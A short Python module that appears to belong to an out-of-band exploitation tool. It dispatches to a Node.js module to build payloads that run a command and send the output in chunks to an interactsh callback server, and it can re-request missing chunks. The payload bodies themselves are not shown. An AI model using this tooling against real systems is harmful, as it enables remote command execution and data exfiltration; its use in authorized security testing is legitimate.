from modules.nodejs import init as nodejs_init, missing_chunks as nodejs_missing_chunks

def generate_init_payload(oob_server, server, chunk_size, command, module):
    """
    Generates the initialization payload.
    
    :param oob_server: The correlation ID received from the server.
    :param server: The interactsh server.
    :param chunk_size: The size of each data chunk.
    :param command: The command to execute.
    :param module: Module to generate payloads
    :return: Initialization payload.
    """
    
    module_map = {
        'nodejs': nodejs_init,
    }
    
    init_function = module_map.get(module)

    payload = init_function(f"{oob_server}.{server}", chunk_size, command)
    return payload


def generate_missing_chunks_payload(missing_indices, oob_server, server, chunk_size, command, module):
    """
    Generates payloads for missing chunks.
    
    :param missing_indices: List of indices of missing data chunks.
    :param oob_server: The correlation ID.
    :param server: The interactsh server.
    :param chunk_size: Size of each chunk.
    :param command: Command to execute.
    :return: Payload to request missing chunks.
    """
    
    module_map = {
        'nodejs': nodejs_missing_chunks,
    }
    
    missing_chunks_function = module_map.get(module)
    
    payload = missing_chunks_function(missing_indices, f"{oob_server}.{server}", chunk_size, command)
    return payload
